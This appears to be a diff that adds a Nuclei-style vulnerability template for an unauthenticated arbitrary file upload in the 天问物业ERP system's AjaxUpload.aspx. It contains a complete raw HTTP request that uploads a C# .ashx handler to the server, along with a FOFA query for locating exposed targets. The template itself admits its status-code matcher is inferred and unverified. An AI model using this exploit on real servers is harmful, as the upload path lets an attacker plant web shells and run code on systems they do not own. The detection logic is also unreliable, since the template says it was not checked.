@@ -1,0 +1,21 @@
+id: poc-be2d13d324807105295b
+info:
+  name: 天问物业ERP系统AjaxUpload.aspx前台任意文件上传漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/be2d13d324807105295bb2818a9aa93a
+
+    [!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
+  tags: file-upload,2025
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: be2d13d324807105295bb2818a9aa93a
+    fofa: + fofa`body="国家版权局软著登字第1205328号"`
+http:
+- raw:
+  - "POST /HM/M_Main/AjaxUpload.aspx HTTP/1.1\nContent-Type: multipart/form-data; boundary=00content0boundary00\nUser-Agent: Java/1.8.0_381\nHost: {{Hostname}}\nAccept: text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2\nContent-Length: 487\nConnection: close\n\n--00content0boundary00\nContent-Disposition: form-data; name=\"UpFileData\"; filename=\"1.ashx\"\n\n<% @ webhandler language=\"C#\" class=\"AverageHandler\" %>\nusing System;\nusing System.Web;\n\npublic class AverageHandler : IHttpHandler\n{\n    public bool IsReusable\n    {\n        get {\n             return true;\n            }\n        }\n        public void ProcessRequest(HttpContext ctx)\n        {\n            ctx.Response.Write(\"hello\");\n        }\n    }\n--00content0boundary00--"
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
